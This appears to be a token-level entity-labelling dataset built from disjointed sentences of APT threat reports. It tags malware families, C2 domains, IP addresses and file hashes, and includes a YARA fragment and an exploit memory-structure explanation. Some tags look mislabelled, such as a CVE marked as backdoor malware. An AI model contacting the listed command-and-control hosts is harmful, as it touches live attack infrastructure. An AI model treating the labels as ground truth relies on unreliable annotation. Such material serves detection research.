not	O
have	O
embedded	O
versioning	O
Information	O
like	O
netsat.exe	B-malware.infosteal
did	O
.	O

Organizations	O
also	O
need	O
deep	O
forensics	O
to	O
identify	O
the	O
scope	O
and	O
impact	O
of	O
a	O
breach	O
,	O
as	O
well	O
as	O
an	O
enterprise-wide	O
incident	O
response	O
plan	O
that	O
can	O
be	O
carried	O
out	O
quickly	O
and	O
at	O
scale	O
.	O

All	O
rights	O
reserved	O
.	O

ShellMain	O

In	O
this	O
case	O
,	O
execution	O
code	O
results	O
it	O
seems	O
that	O
Darkhotel	B-malware.infosteal
operators	O
are	O
checking	O
as	O
to	O
whether	O
or	O
not	O
the	O
victim	O
's	O
default	O
browser	O
is	O
Internet	O
Explorer	O
,	O
as	O
all	O
versions	O
of	O
IE	O
return	O
the	O
value	O
'	O
0	O
'	O
and	O
other	O
browsers	O
leave	O
'	O
appMinorVersion	O
'	O
undefined	O
.	O

de.keineantwort.android.urlshortener.Searching	O
for	O
the	O
application	O
in	O
Google	O
Play	O
store	O
with	O
that	O
specific	O
package	O
name	O
(	O
https://play.google.com/store/apps/details?id=de.keineantwort.android.urlshortener	B-url.normal
)	O
yields	O
:	O
The	O
application	O
exists	O
in	O
the	O
store	O
and	O
the	O
Libyan	B-malware.infosteal
Scorpions	I-malware.infosteal
hacking	O
group	O
took	O
an	O
instance	O
of	O
the	O
APK	O
and	O
injected	O
their	O
malware	O
into	O
that	O
legitimate	O
application	O
to	O
spread	O
it	O
.	O

Even	O
though	O
process	O
operators	O
face	O
no	O
increased	O
risk	O
from	O
the	O
currently	O
identified	O
members	O
of	O
the	O
IRONGATE	B-malware.backdoor
malware	O
family	O
,	O
IRONGATE	B-malware.backdoor
provides	O
valuable	O
insight	O
into	O
adversary	O
mindset	O
.	O

155CAD31A61F	O
to	O
its	O
equivalent	O
sequence	O
of	O
six	O
hexadecimal	O
bytes	O
0x15	O
0x5C	O
0xAD	O
0x31	O
0xA6	O
0x1F	O
,	O
as	O
follows	O
:	O

I	O
have	O
the	O
same	O
machine	O
infected	O
with	O
two	O
different	O
version	O
of	O
ZxShell	B-malware.backdoor
.	O

File	O
Metadata	O

Base64	O
encoded	O
ANEL	B-malware.backdoor
downloaded	O
by	O
Koadic	B-malware.unknown

It	O
rather	O
uses	O
a	O
classic	O
trick	O
already	O
used	O
by	O
several	O
malware	O
instances	O
.	O

Parser	O
:	O
:inString	O
method	O

The	O
RAT	O
uses	O
a	O
raw	O
TCP	O
protocol	O
to	O
exchange	O
information	O
with	O
its	O
C	O
&	O
C	O
;	O
on	O
the	O
wire	O
,	O
the	O
comms	O
look	O
something	O
like	O
this	O
(	O
modified	O
and	O
re-encrypted	O
to	O
protect	O
some	O
of	O
our	O
sensitive	O
sandbox	O
information	O
)	O
:	O

167.160.36.101	B-ip.unknown
United	O
States	O
Lewes	O
Gwy	O
It	O
Pty	O
Ltd	O
,	O
Web2Objects	O
LLC	O
107.191.47.42	B-ip.unknown
United	O
States	O
Tampa	O
Vultr	O
Holdings	O
Llc	O
,	O
Choopa	O
,	O
LLC	O
84.200.68.163	B-ip.unknown
Germany	O
Freinsheim	O
Ip	O
Projects	O
,	O
IP-Projects	O
GmbH	O
&	O
Co	O
.	O

In	O
February	O
2014	O
,	O
Iran	O
launched	O
a	O
destructive	O
attack	O
on	O
the	O
Sands	O
Las	O
Vegas	O
Corporation	O
that	O
caused	O
significant	O
network	O
damage	O
.	O

The	O
filename	O
is	O
possibly	O
a	O
misspelled	O
reference	O
to	O
Sarabjit	O
Singh	O
,	O
an	O
Indian	O
national	O
who	O
was	O
arrested	O
and	O
convicted	O
of	O
terrorism	O
and	O
espionage	O
charges	O
in	O
1991	O
by	O
Pakistani	O
authorities	O
.	O

Fig	O
11	O
.	O

This	O
becomes	O
evident	O
when	O
looking	O
at	O
the	O
list	O
of	O
Babar	O
's	O
obfuscated	O
API	O
names	O
,	O
which	O
includes	O
RegisterRawInputDevices	O
,	O
GetRawInputData	O
,	O
GetClipboardData	O
or	O
DirectSoundCaptureCreate	O
.	O

Who	O
's	O
using	O
it	O
,	O
and	O
who	O
's	O
being	O
targeted	O
?	O

This	O
is	O
important	O
because	O
if	O
any	O
system	O
tool	O
tries	O
to	O
open	O
the	O
host	O
process	O
it	O
will	O
never	O
display	O
the	O
ZxShell	B-malware.backdoor
DLL	O
.	O

APT28	B-malware.infosteal
IS	O
IN	O
YOUR	O
NETWORK	O
.	O

The	O
stolen	O
files	O
are	O
then	O
exfiltrated	O
by	O
abusing	O
a	O
cloud	O
storage	O
service	O
.	O

The	O
last	O
page	O
302	O
redirects	O
to	O
the	O
website	O
of	O
an	O
Israeli	O
office	O
supply	O
company	O
Mafil	O
:	O
Sample	O
f6d5b8d58079c5a008f7629bdd77ba7f	B-hash
,	O
also	O
a	O
self-extracting	O
archive	O
,	O
contained	O
a	O
decoy	O
PDF	O
document	O
and	O
a	O
backdoor	O
:	O
The	O
PDF	O
,	O
named	O
IEC.pdf	O
,	O
is	O
a	O
warranty	O
document	O
taken	O
from	O
Mafil	O
's	O
public	O
website	O
.	O

or	O
USERPROFILE	O
environment	O
variables	O
or	O
the	O
Windows	O
directory	O

While	O
the	O
original	O
campaign	O
was	O
comprehensive	O
and	O
used	O
remote	O
access	O
Trojans	B-malware.backdoor
(	O
RATs	O
)	O
such	O
as	O
ChChes	B-malware.backdoor
and	O
RedLeaves	B-malware.backdoor
,	O
this	O
new	O
campaign	O
used	O
a	O
new	O
backdoor	O
(	O
Detected	O
by	O
Trend	O
Micro	O
as	O
BKDR_ANEL.ZKEI	B-malware.backdoor
)	O
that	O
leverages	O
the	O
CVE-2017-8759	O
vulnerability	O
for	O
its	O
cyberespionage	O
activities	O
.	O

Value	O

'	O
It	O
is	O
rare	O
enough	O
to	O
learn	O
of	O
an	O
attack	O
of	O
this	O
potential	O
magnitude	O
in	O
advance	O
,	O
but	O
to	O
have	O
all	O
of	O
the	O
information	O
necessary	O
to	O
stop	O
it	O
before	O
it	O
begins	O
is	O
unprecedented	O
,	O
'	O
said	O
an	O
unnamed	O
root9B	O
analyst	O
.	O

*	O
More	O
information	O
about	O
the	O
ScarCruft	B-malware.infosteal
APT	O
group	O
is	O
available	O
to	O
customers	O
of	O
Kaspersky	O
Intelligent	O
Services	O
.	O

Threat	O
Analysis	O
Insikt	O
Group	O
researchers	O
regularly	O
follow	O
North	O
Korean	O
threat	O
actors	O
through	O
a	O
variety	O
of	O
methods	O
,	O
one	O
of	O
which	O
includes	O
proactive	O
monitoring	O
of	O
attack	O
vectors	O
based	O
on	O
software	O
disproportionately	O
adopted	O
in	O
South	O
Korea	O
.	O

His	O
work	O
has	O
appeared	O
in	O
Hakin9	O
,	O
USENIX	O
;	O
login	O
:	O
,	O
Dr	O
.	O

725fc0d7a8e7b9e01a83111619744b6f	B-hash
msdsp.dll	O
654234576804d	O
cdind.antivirup.com:8081	B-url.cncsvr

Our	O
research	O
indicates	O
that	O
EvilGrab	B-malware.drop
activity	O
is	O
most	O
prevalent	O
in	O
China	O
and	O
Japan	O
,	O
although	O
it	O
is	O
also	O
present	O
in	O
other	O
parts	O
of	O
the	O
world	O
.	O

Although	O
the	O
2015	O
campaign	O
did	O
not	O
focus	O
on	O
individuals	O
associated	O
with	O
U.S.	O
politics	O
,	O
open-source	O
evidence	O
suggests	O
that	O
TG-4127	B-malware.infosteal
targeted	O
individuals	O
connected	O
to	O
the	O
U.S.	O
White	O
House	O
in	O
early	O
2015	O
.	O

The	O
shellcode	O
then	O
decrypts	O
'	O
a.exe	O
'	O
and	O
moves	O
it	O
to	O
'	O
b.exe	O
'	O
in	O
the	O
same	O
directory	O
.	O

The	O
use	O
of	O
this	O
Cisco	O
application	O
could	O
also	O
reveal	O
that	O
the	O
intended	O
targets	O
of	O
this	O
attack	O
may	O
be	O
a	O
system	O
administrator	O
holding	O
higher-level	O
privileged	O
access	O
credentials	O
to	O
multiple	O
areas	O
of	O
the	O
network	O
enterprise	O
and	O
infrastructure	O
.	O

We	O
reported	O
the	O
related	O
vulnerability	O
to	O
Adobe	O
in	O
January	O
2014	O
,	O
when	O
it	O
was	O
being	O
used	O
by	O
the	O
Darkhotel	B-malware.infosteal
APT	O
.	O

So	O
first	O
let	O
's	O
see	O
what	O
our	O
(	O
tentatively	O
named	O
)	O
DecryptCommandBuffer_sub_44C628	O
(	O
)	O
function	O
looks	O
like	O
.	O

Rebooting	O
the	O
system	O
.	O

sensor	O
environments.doc	O
Global_A&D_outlook_2012.pdf	O
FY2013_Budget_Request	O
.doc	O
Understand	O
your	O
blood	O
test	O
report.pdf	O
RHT_SalaryGuide_2012.pdf	O
Security	O
Predictions	O
for	O
2012	O
and	O
2013.pdf	O
April	O
Is	O
the	O
Cruelest	O
Month.pdf	O
National	O
Human	O
Rights	O
Action	O
Plan	O
of	O
China	O
(	O
2012­2015	O
)	O
.pdf	O
Dept	O
of	O
Defense	O
FY12	O
A	O
STTR	O
Solicitation	O
Topics	O
of	O
Interest	O
to	O
Boeing.pdf	O
Boeing_Current_Market_Outlook_2011_to_2030.pdf	O
RHT_SalaryGuide_2012.pdf	O
dodd­frank­conflict­minerals.doc	O
Conflict­Minerals­Overview­for­KPMG.doc	O
сообщить.doc	O
From	O
the	O
timeline	O
below	O
,	O
we	O
were	O
able	O
to	O
figure	O
out	O
that	O
this	O
campaign	O
has	O
been	O
targeting	O
companies	O
in	O
the	O
Aerospace	O
and	O
Defense	O
vertical	O
in	O
waves	O
.	O

typedef	O
struct	O
tagSAFEARRAY	O
{	O
USHORT	O
cDims	O
;	O
//	O
cDims	O
=	O
0001	O
USHORT	O
fFeatures	O
;	O
fFeatures	O
=0x0880	O
ULONG	O
cbElements	O
;	O
//	O
the	O
byte	O
occupied	O
by	O
one	O
element	O
(	O
1	O
byte	O
)	O
ULONG	O
cLocks	O
;	O
PVOID	O
pvData	O
;	O
//	O
Buffer	O
of	O
data	O
starts	O
from	O
0x0	O
SAFEARRAYBOUND	O
rgsabound	O
;	O
}	O
SAFEARRAY	O
,	O
*LPSAFEARRAY	O
;	O
typedef	O
struct	O
tagSAFEARRAYBOUND	O
{	O
ULONG	O
cElements	O
;	O
//	O
the	O
number	O
of	O
elements	O
(	O
0x7fffffff	O
,	O
user	O
space	O
)	O
LONG	O
lLbound	O
;	O
//	O
the	O
initial	O
value	O
of	O
the	O
index	O
(	O
starting	O
from	O
0	O
)	O
}	O
SAFEARRAYBOUND	O
,	O
*LPSAFEARRAYBOUND	O
;	O
A	O
forged	O
array	O
composes	O
of	O
a	O
one-dimensional	O
array	O
,	O
the	O
number	O
of	O
elements	O
is	O
7fffffff	O
,	O
each	O
element	O
occupies	O
1	O
byte	O
,	O
and	O
the	O
element	O
memory	O
address	O
is	O
0	O
.	O

With	O
a	O
set	O
of	O
tools	O
developed	O
for	O
the	O
sole	O
purpose	O
of	O
information	O
gathering	O
and	O
privilege	O
escalation	O
,	O
the	O
sophistication	O
level	O
of	O
campaign	O
highlights	O
that	O
,	O
today	O
,	O
regional	O
actors	O
are	O
not	O
far	O
behind	O
better­known	O
players	O
in	O
the	O
global	O
game	O
of	O
targeted	O
attacks	O
.	O

In	O
some	O
cases	O
,	O
servers	O
were	O
found	O
running	O
on	O
facilities	O
provided	O
by	O
commercial	O
hosting	O
providers	O
that	O
could	O
have	O
been	O
purchased	O
by	O
actors	O
from	O
any	O
country	O
.	O

Although	O
there	O
are	O
no	O
current	O
infrastructure	O
ties	O
to	O
link	O
this	O
backdoor	O
to	O
APT12	O
,	O
there	O
are	O
several	O
data	O
points	O
that	O
show	O
a	O
possible	O
tie	O
to	O
the	O
same	O
actors	O
:	O
Same	O
initial	O
delivery	O
method	O
(	O
spear	O
phishing	O
email	O
)	O
with	O
a	O
Microsoft	O
Word	O
Document	O
exploiting	O
CVE-2012-0158	B-malware.backdoor
.	O

GET	O
/<string>/<5digitnumber>/<4characterstring>.php	O
?	O

안다리엘	O
그룹의	O
초기	O
공격	O
목표는	O
군사	O
기관과	O
방위산업체였다	O
.	O

Thanks	O
to	O
this	O
information	O
,	O
we	O
we	O
able	O
to	O
understand	O
how	O
they	O
tested	O
malicious	O
documents	O
in	O
order	O
to	O
decrease	O
detection	O
ratios	O
across	O
many	O
popular	O
engines	O
.	O

Here	O
is	O
the	O
PDB	O
path	O
of	O
the	O
sample	O
:	O

To	O
learn	O
more	O
,	O
read	O
our	O
Security	O
101	O
:	O
Business	O
Process	O
Compromise	O
.	O

<	O
PING	O
>	O
'	O
is	O
sent	O
from	O
C2	O
to	O
host	O
,	O
and	O
'	O
<	O
PONG	O
>	O
'	O
is	O
sent	O
from	O
host	O
to	O
C2	O
,	O
to	O
keep	O
connection	O
alive	O
.	O

.רורט	O
עוגיפב	O
העיצפ	O
טילש	O
דעלג	O

Data	O
:	O
%	O
temp%\c_1758.nls	O
Potential	O
variation	O
Potential	O
variation	O

00	O
00	O
}	O
condition	O
:	O
(	O
(	O
uint16	O
(	O
0	O
)	O
==	O
0x5A4D	O
)	O
)	O
and	O
(	O
filesize	O
<	O
5000000	O
)	O
and	O
(	O
all	O
of	O
them	O
)	O
When	O
run	O
on	O
our	O
extensive	O
(	O
read	O
:	O
very	O
big	O
)	O
malware	O
collection,.Unsurprisingly	O
,	O
when	O
used	O
alone	O
,	O
each	O
string	O
can	O
generate	O
false	O
positives	O
or	O
catch	O
other	O
unrelated	O
malware..	O

30/11/12	O

Some	O
of	O
this	O
activity	O
and	O
patterns	O
were	O
publicly	O
disclosed	O
,	O
so	O
we	O
expect	O
to	O
see	O
more	O
change	O
in	O
their	O
process	O
in	O
2018	O
.	O

The	O
developer	O
used	O
at	O
least	O
two	O
different	O
usernames	O
in	O
the	O
past	O
two	O
years	O
:	O
'	O
The	O
Invincible	O
'	O
and	O
'	O
TheMartian	O
.	O
'	O

securmon.dll	O
AppMgmt.dll	O
A0029670.dll	O
(	O
A00#####.dll	O
)	O
msconfi	O
g32.sys	O
VedioDriver.dll	O
acelpvc.dll	O
wuauclt.exe	O
jucheck.exe	O
AdobeUpdateManager.exe	O
zf32.dll	O

Uninstall	O

Today	O
,	O
Cisco	O
Talos	O
is	O
uncovering	O
a	O
new	O
piece	O
of	O
malware	O
,	O
which	O
has	O
remained	O
under	O
the	O
radar	O
for	O
the	O
past	O
two	O
years	O
while	O
it	O
continues	O
to	O
be	O
developed	O
.	O

From	O
these	O
messages	O
,	O
the	O
malware	O
can	O
extract	O
fields	O
such	O
as	O
transfer	O
references	O
and	O
SWIFT	O
addresses	O
to	O
interact	O
with	O
the	O
system	O
database	O
.	O

Search	O
:	O

The	O
malware	O
employed	O
shared	O
code	O
with	O
Destover	B-malware.backdoor
malware	O
(	O
Intel	O
Card	O
)	O
,	O
which	O
was	O
used	O
against	O
Sony	O
Pictures	O
Entertainment	O
in	O
2014	O
and	O
the	O
first	O
WannaCry	B-malware.ransom
victim	O
in	O
February	O
2017	O
.	O

Smokescreen	O
The	O
operations	O
may	O
be	O
part	O
of	O
a	O
targeted	O
attack	O
that	O
seeks	O
to	O
disguise	O
itself	O
and	O
its	O
possible	O
targets	O
,	O
by	O
using	O
spam	O
services	O
to	O
launch	O
the	O
attacks	O
.	O

On	O
the	O
same	O
day	O
,	O
360	O
immediately	O
communicated	O
with	O
Microsoft	O
and	O
submitted	O
details	O
of	O
the	O
vulnerability	O
to	O
Microsoft	O
.	O

Our	O
sinkhole	O
of	O
some	O
C	O
&	O
C	O
domains	O
used	O
by	O
the	O
Win32/Wemosis	B-malware.backdoor
has	O
resulted	O
in	O
hits	O
from	O
bots	O
in	O
the	O
following	O
countries	O
.	O

Research	O
indicates	O
that	O
EvilGrab	B-malware.drop
is	O
primarily	O
distributed	O
through	O
spear-phishing	O
emails	O
with	O
malicious	O
attachments	O
that	O
exploit	O
various	O
vulnerabilities	O
to	O
run	O
malicious	O
code	O
.	O

Fighthard.mooo.com	B-url.unknown
additionally	O
resolved	O
to	O
173.224.214.12	B-ip.unknown
in	O
February	O
of	O
2014	O
.	O

The	O
Pastebin	O
userid	O
matched	O
with	O
the	O
Email	O
ID	O
mentioned	O
by	O
this	O
individual	O
in	O
the	O
YouTube	O
video	O
description	O
section	O
as	O
shown	O
below	O
.	O

Randomly	O
generated	O
UUID	O
Figure	O
15	O
.	O

Both	O
groups	O
have	O
been	O
observed	O
using	O
the	O
same	O
IP	O
address	O
for	O
command	O
and	O
control	O
purposes	O
.	O

hash	O
:	O
A88E8181CA5CE35AE70C76145DFB820D	O
BYTES	O

We	O
previously	O
observed	O
only	O
one	O
other	O
group	O
using	O
a	O
similar	O
method	O
–	O
ItaDuke	B-malware.unknown
–	O
that	O
connected	O
to	O
accounts	O
on	O
the	O
cloud	O
provider	O
mydrive.ch	O
.	O

This	O
way	O
Babar	B-malware.drop
can	O
install	O
API	O
hooks	O
for	O
various	O
APIs	O
via	O
Windows	O
Detours	O
technique	O
to	O
actively	O
steal	O
data	O
from	O
arbitrary	O
processes	O
.	O

The	O
communication	O
to	O
the	O
C2	O
is	O
performed	O
also	O
in	O
this	O
case	O
by	O
using	O
the	O
HTTPS	O
protocol	O
.	O

Here	O
is	O
the	O
list	O
of	O
common	O
commands	O
:	O

Notes	O
:	O

The	O
ShellMainThreadInt	O
function	O
gets	O
the	O
HeapDestroy	O
Windows	O
API	O
address	O
and	O
replaces	O
the	O
first	O
3	O
bytes	O
with	O
the	O
RET	O
4	O
opcode	O
.	O

We	O
have	O
seen	O
RTF	O
files	O
with	O
the	O
following	O
names	O
used	O
in	O
attacks	O
:	O
prikaz-451.doc	O
REMITTANCE	O
ADVICE	O
ON	O
REJECTION.doc	O
PROOF	O
OF	O
REMITTANCE	O
ADVICE	O
.doc	O
HDHS739_230715_010711_A17C7148_INTERNAL.doc	O
27.07.2015.doc	O
(	O
Armenian	O
:	O
The	O
Law	O
on	O
Banks	O
and	O
Banking	O
27.07.2015	O
)	O
PAYMENT	O
DETAILS.doc	O
doc	O
(	O
Russian	O
:	O
Alpha-bank	O
contract	O
)	O
AML	O
REPORTS_20082015_APPLICATION	O
FORM-USD-MR	O
VYDIAR.doc	O
Anti-Money	O
Laudering	O
&	O
Suspicious	O
cases.doc	O
ApplicationXformXUSDXduplicateXpayment.doc	O
AML	O
USD	O
&	O
Suspicious	O
cases.doc	O
Amendment	O
inquiry	O
(	O
reference	O
TF1518869100.doc	O
Information	O
2.doc	O
Here	O
is	O
example	O
of	O
a	O
spearphishing	O
message	O
that	O
was	O
sent	O
to	O
a	O
bank	O
in	O
the	O
United	O
Arab	O
Emirates	O
:	O
Here	O
is	O
example	O
of	O
a	O
spearphishing	O
email	O
that	O
was	O
sent	O
to	O
a	O
German	O
bank	O
:	O
Win32/Spy.Agent.ORM	B-malware.infosteal
is	O
a	O
small	O
and	O
simple	O
backdoor	O
that	O
enables	O
the	O
attackers	O
to	O
assess	O
the	O
victim	O
.	O

LinkID=149156&v=3.0.40624.0	O
'	O
style='text-decoration	O
:	O
none	O
;	O
'	O
>	O
<	O
img	O
src='/web/20170203175640im_/	B-url.unknown
http://go.microsoft.com/fwlink/?LinkId=108181	I-url.unknown
'	O
alt='Get	O
Microsoft	O
Silverlight	O
'	O
style='border-style	O
:	O
none'/	O
>	O
<	O
/a	O
>	O
<	O
/object	O
>	O
<	O
iframe	O
id='_sl_historyFrame	O
'	O
style='visibility	O
:	O
hidden	O
;	O
height:0	O
;	O
width:0	O
;	O
border:0px	O
'	O
>	O
<	O
/iframe	O
>	O
<	O
/div	O
>	O
eye-watch[.]in	O
domain	O
appears	O
to	O
have	O
been	O
used	O
in	O
watering-hole	O
attacks	O
on	O
other	O
financial	O
sector	O
websites	O
.	O

Figure	O
12	O
-	O
Malware	O
Sets	O
the	O
Flag	O
WINHTTP_FLAG_SECURE	O
Requesting	O
An	O
SSL/TLS	O
Connection	O
Out	O
Commercial	O
enterprises	O
will	O
generally	O
purchase	O
SSL	O
Inspection	O
hardware	O
that	O
essentially	O
perform	O
a	O
Man-In-The-Middle	O
technique	O
on	O
all	O
SSL/	O
TLS	O
traffic	O
that	O
passes	O
through	O
it	O
,	O
allowing	O
the	O
entity	O
to	O
have	O
visibility	O
and	O
inspection	O
of	O
network	O
traffic	O
that	O
would	O
otherwise	O
be	O
non-visible	O
.	O

This	O
effectively	O
defeats	O
many	O
automation	O
systems	O
that	O
rely	O
on	O
at	O
least	O
one	O
of	O
the	O
toolsets	O
they	O
check	O
to	O
avoid	O
.	O

Configure	O
Group	O
Policy	O
to	O
restrict	O
all	O
users	O
to	O
only	O
one	O
login	O
session	O
,	O
where	O
possible	O
.	O

The	O
threat	O
group	O
in	O
this	O
recently	O
observed	O
campaign	O
–	O
TEMP.Zagros	O
–	O
weaponized	O
their	O
malware	O
using	O
the	O
following	O
techniques	O
.	O

This	O
group	O
is	O
known	O
to	O
have	O
targeted	O
U.S.	O
government	O
agencies	O
,	O
defense	O
contractors	O
,	O
aerospace	O
firms	O
and	O
foreign	O
militaries	O
since	O
2009	O
.	O

April	O
17	O
,	O
2013	O
|	O
by	O
James	O
T	O
.	O

Because	O
the	O
body	O
of	O
industrial	O
control	O
systems	O
(	O
ICS	O
)	O
and	O
supervisory	O
control	O
and	O
data	O
acquisition	O
(	O
SCADA	O
)	O
malware	O
is	O
limited	O
,	O
we	O
are	O
sharing	O
details	O
with	O
the	O
broader	O
community	O
.	O

sqlxmlx.inc	O
is	O
not	O
created	O
to	O
store	O
user	O
information	O
.	O

In	O
order	O
to	O
accomplish	O
this	O
,	O
we	O
undertook	O
several	O
different	O
approaches	O
during	O
the	O
investigation	O
.	O

Also	O
,	O
the	O
analysis	O
of	O
the	O
incident	O
led	O
to	O
the	O
discovery	O
of	O
multiple	O
malwares	O
targeting	O
Android	O
and	O
Windows	O
machines	O
.	O

攻击分析及溯源	O

The	O
script	O
downloads	O
and	O
reads	O
an	O
image	O
 le	O
from	O
a	O
remote	O
location	O
and	O
carves	O
out	O
a	O
hidden	O
PowerShell	O
implant	O
script	O
embedded	O
within	O
the	O
image	O
 le	O
to	O
execute	O
.	O

However	O
,	O
nobody	O
noticed	O
that	O
these	O
fragments	O
actually	O
belonged	O
to	O
the	O
same	O
threat	O
actor	O
.	O

Using	O
a	O
HEX	O
viewer	O
,	O
it	O
is	O
possible	O
to	O
see	O
that	O
this	O
file	O
also	O
contains	O
a	O
ZIP	O
file	O
(	O
beginning	O
at	O
the	O
'	O
PK	O
'	O
header	O
)	O
,	O
with	O
the	O
pixelated	O
image	O
above	O
referencing	O
the	O
bytes	O
of	O
the	O
file	O
to	O
be	O
RGB	O
values	O
.	O

589f10e2efdd98bfbdc34f247b6a347f	B-hash

Yet	O
,	O
perhaps	O
in	O
response	O
to	O
the	O
growing	O
awareness	O
of	O
previous	O
and	O
often	O
widely	O
targeted	O
attacks	O
against	O
the	O
Syrian	O
opposition	O
,	O
attackers	O
continue	O
to	O
innovate	O
and	O
experiment	O
with	O
new	O
techniques	O
that	O
blend	O
social	O
engineering	O
with	O
new	O
attack	O
styles	O
.	O

In	O
addition	O
,	O
the	O
concept	O
of	O
using	O
self-extracting	O
archives	O
and	O
decoy	O
documents	O
is	O
not	O
groundbreaking	O
or	O
new	O
,	O
as	O
we	O
have	O
seen	O
similar	O
attacks	O
being	O
carried	O
in	O
the	O
past	O
by	O
the	O
Gaza	O
Cybergang	O
APT	O
group	O
.	O

The	O
IP	O
address	O
200.63.46.33	O
is	O
currently	O
anounced	O
by	O
Panamaserver.com	O

Intelligence	O
agencies	O
succeeding	O
in	O
penetrating	O
Hezbollah.exe	O
IDF	O
survey	O
Research	O
Center	O
unused	O
condom	O

Analysts	O
studied	O
the	O
remaining	O
domains	O
registered	O
on	O
that	O
server	O
,	O
and	O
initially	O
noted	O
that	O
one	O
in	O
particular	O
,	O
CBIUAEBANK	B-url.cncsvr
.	O

Figure	O
6	O
:	O
C/C++	O
version	O
of	O
RATANKBA	B-malware.backdoor
Figure	O
7	O
:	O
Powershell	O
version	O
of	O
RATANKBA	B-malware.backdoor

Pastebin	O
URL	O
's	O
Hosting	O
Malicious	O
Payload	O
:	O

APT	B-malware.unknown
CAMPAIGN	I-malware.unknown
(	O
NUM	O
DAYS	O
BEFORE	O
APT	B-malware.unknown
CAMPAIGN	I-malware.unknown
OF	O
SAMPLES	O
)	O
PUBLICALLY	O
IDENTIFIED	O

This	O
is	O
consistent	O
with	O
the	O
complex	O
relationships	O
between	O
the	O
different	O
nations	O
and	O
political	O
groups	O
in	O
the	O
region	O
;	O
In	O
their	O
August	O
2013	O
blog	O
,	O
FireEye	O
noted	O
that	O
a	O
group	O
they	O
refer	O
to	O
as	O
MoleRats	O
used	O
Poison	O
Ivy	O
and	O
Xtreme	O
RAT	O
,	O
in	O
conjunction	O
with	O
a	O
password	O
of	O
'	O
!	O
@	O
#	O
GooD	O
#	O
@	O
!	O
'	O

All	O
rights	O
reserved	O
.	O

안다리엘	O
그룹은	O
다양한	O
악성코드를	O
사용하여	O
다수의	O
공격을	O
전개했는데	O
,	O
코드의	O
유사성	O
외에도	O
이들	O
다수	O
의	O
공격	O
사이에는	O
연관성을	O
짐작할	O
수	O
있는	O
요소가	O
있다	O
.	O

Link	O
Analysis	O
of	O
Malware	O
Actors	O
using	O
PalantirTM	O

The	O
use	O
of	O
different	O
infection	O
methods	O
combined	O
with	O
the	O
abuse	O
of	O
legitimate	O
signed	O
binaries	O
to	O
load	O
malicious	O
code	O
makes	O
these	O
campaigns	O
worth	O
highlighting	O
.	O

In	O
this	O
scenario	O
,	O
responders	O
'	O
only	O
saving	O
grace	O
would	O
be	O
the	O
use	O
of	O
a	O
weak	O
RSA	O
modulus	O
.	O

They	O
worked	O
on	O
malicious	O
code	O
,	O
and	O
produced	O
four	O
variants	O
.	O

TsBase	O
,	O
another	O
attacker-written	O
module	O
,	O
contains	O
the	O
functions	O
called	O
by	O
TsHi	B-malware.unknown
,	O
which	O
translate	O
the	O
attacker	O
's	O
intended	O
action	O
to	O
the	O
appropriate	O
TriStation	O
protocol	O
function	O
code	O
.	O

The	O
payload	O
uses	O

Figure	O
3	O
:	O
RATANKBA	B-malware.backdoor
communication	O
diagram	O

As	O
such	O
we	O
believe	O
the	O
campaign	O
using	O
this	O
downloader	O
malware	O
has	O
been	O
on­going	O
for	O
approximately	O
12	O
months	O
.	O

Login	O
Checkbox	O
Attempt	O
to	O
use	O
the	O
username	O
,	O
password	O
,	O
and	O
domain	O
from	O
the	O
User	O
,	O
Pass	O
and	O
Domain	O
fields	O
and	O
LogonUserA	O
(	O
)	O
Win32	O
API	O
function	O
to	O
impersonate	O
a	O
specific	O
user	O
.	O

Turla	O
Carbon	B-malware.backdoor
package	O

Figure	O
17	O
.	O

Here	O
's	O
the	O
list	O
of	O
supported	O
commands	O
:	O

The	O
malware	O
contains	O
strings	O
referring	O
to	O
'	O
Data	O
Protector	O
v2	O
'	O
which	O
appears	O
to	O
refer	O
a	O
crypter	O
that	O
is	O
compatible	O
with	O
a	O
range	O
of	O
RATs	O
and	O
advertised	O
for	O
download	O
in	O
a	O
number	O
of	O
forums	O
.	O

Meanwhile	O
,	O
the	O
Naxalites_Funded_By_Pakistan.scr	O
file	O
drops	O
a	O
slightly	O
different	O
malware	O
component	O
and	O
an	O
alternate	O
decoy	O
document	O
.	O

It	O
sums	O
up	O
the	O
values	O
of	O
the	O
two	O
swapped	O
elements	O
(	O
at	O
instruction	O
0x0044C85F	O
)	O
,	O
then	O
uses	O
the	O
result	O
(	O
modulo	O
256	O
)	O
to	O
re-index	O
into	O
the	O

The	O
HTA	O
script	O
(	O
Figure	O
4	O
)	O
contains	O
VBS	O
code	O
that	O
fetches	O
a	O
second	O
blob	O
of	O
VBS	O
code	O
encoded	O
in	O
base64	O
form	O
from	O
hxxp://<redacted>/ilha/pz/logs.php	O
.	O

Typically	O
,	O
every	O
couple	O
of	O
days	O
a	O
new	O
IP	O
configuration	O
is	O
introduced	O
for	O
some	O
boxes	O
,	O
while	O
others	O
may	O
remain	O
static	O
–	O
such	O
as	O
the	O
host	O
lokia.mine.nu	B-url.cncsvr
,	O

At	O
this	O
point	O
,	O
'	O
oledvbs.inc	O
'	O
already	O
stores	O
systeminfo	O
output	O
.	O

What	O
is	O
behind	O
these	O
IP	O
addresses	O
is	O
hard	O
to	O
establish	O
.	O

Embedded	O
string	O
table	O
in	O
resource	O
section	O
with	O
language	O
set	O
to	O
Chinese	O

Same	O
as	O
previous	O
illustration	O
,	O
where	O
new	O
unsigned	O
samples	O
are	O
shown	O
to	O
be	O
related	O
through	O
the	O
usage	O
of	O
the	O
same	O
C	O
&	O
C	O
infrastructure.Colours	O
have	O
changed	O
–	O
now	O
the	O
certificate	O
is	O
green	O
,	O
the	O
C	O
&	O
C	O
servers	O
are	O
yellow	O
,	O
the	O
samples	O
are	O
blue	O
,	O
while	O
IP	O
addresses	O
are	O
purple	O
.	O

In	O
addition	O
,	O
EvilGrab	B-malware.drop
can	O
upload	O
files	O
from	O
the	O
affected	O
system	O
to	O
remote	O
servers	O
.	O

Read	O
a	O
specified	O
file	O
's	O
contents	O
and	O
send	O
the	O
data	O
to	O
the	O
control	O
server	O
Write	O
data	O
sent	O
by	O
the	O
control	O
server	O
to	O
an	O
existing	O
file	O
Mark	O
a	O
file	O
to	O
be	O
deleted	O
on	O
reboot	O
Marking	O
a	O
file	O
for	O
deletion	O
on	O
reboot	O
.	O

'	O
The	O
item_info	O
entry	O
consists	O
of	O
item_count	O
elements	O
that	O
are	O
interpreted	O
as	O
key/value	O
pairs	O
of	O
indices	O
into	O
the	O
string	O
table	O
of	O
the	O
constant	O
pool	O
.	O

The	O
malicious	O
DLL	O
exports	O
21	O
functions	O
.	O

v7	O
=	O
v2	O
;	O
v3	O
=	O
0	O
;	O
